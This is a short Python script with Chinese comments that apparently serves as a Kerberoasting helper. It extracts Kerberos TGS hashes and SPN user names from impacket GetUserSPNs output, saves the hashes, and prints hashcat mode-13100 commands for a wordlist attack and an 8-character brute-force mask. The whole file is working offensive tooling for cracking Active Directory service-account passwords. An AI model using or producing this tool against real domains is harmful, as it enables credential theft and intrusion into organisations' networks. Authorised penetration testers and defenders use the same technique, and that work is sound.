#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kerberoast 辅助: 从 impacket/GetUserSPNs 输出提取哈希 → 生成 hashcat 命令
用法:
  python kerberoast_prep.py -f spns_output.txt -o kerb_hashes.txt
"""
import argparse, hashlib, re, sys

def extract_hashes(text):
    """从 GetUserSPNs 输出提取 kerberos TGS 哈希"""
    patterns = [
        r'(\$krb5tgs\$\d+\$[^*]+\$[^*]+\$.+)',  # hashcat 13100
        r'(\$krb5tgs\$\d+\$.+?)(?:\s|$)',        # 宽松匹配
        r'(\\$krb5tgs\\$[^\\s]+)',                # 转义格式
    ]
    hashes = set()
    for p in patterns:
        for m in re.finditer(p, text):
            h = m.group(1).replace("\\", "").strip()
            if h.startswith("$krb5tgs$") and len(h) > 50:
                hashes.add(h)
    return sorted(hashes)

def extract_users(text):
    """提取 SPN 关联用户"""
    users = set()
    for m in re.finditer(r'([A-Za-z0-9_-]+)@[A-Z]+\.(?:\w|\d)+', text):
        users.add(m.group(0))
    return sorted(users)

def main():
    ap = argparse.ArgumentParser(description="Kerberoast 哈希提取+hashcat 命令生成")
    ap.add_argument("-f", "--file", required=True, help="GetUserSPNs/impacket 输出文件")
    ap.add_argument("-o", "--output", default="kerb_hashes.txt", help="哈希输出文件")
    args = ap.parse_args()

    with open(args.file, encoding="utf-8", errors="ignore") as f:
        text = f.read()

    hashes = extract_hashes(text)
    users = extract_users(text)

    if users:
        print(f"[+] SPN 用户 ({len(users)}):")
        for u in users[:20]:
            print(f"    {u}")

    print(f"\n[+] Kerberos TGS 哈希 ({len(hashes)}):")
    with open(args.output, "w", encoding="utf-8") as f:
        for h in hashes:
            f.write(h + "\n")
            short = h[:80] + "..."
            cmd = "  hashcat -m 13100 -a 3 '" + h + "' ?a?a?a?a?a?a?a?a --force -O"
            print(f"  {short}")
    print(f"\n  已保存 {args.output}")
    print(f"  破解命令: hashcat -m 13100 -a 0 {args.output} rockyou.txt --force -O")
    print(f"  掩码攻击: hashcat -m 13100 -a 3 {args.output} ?a?a?a?a?a?a?a?a --force -O")

if __name__ == "__main__":
    main()
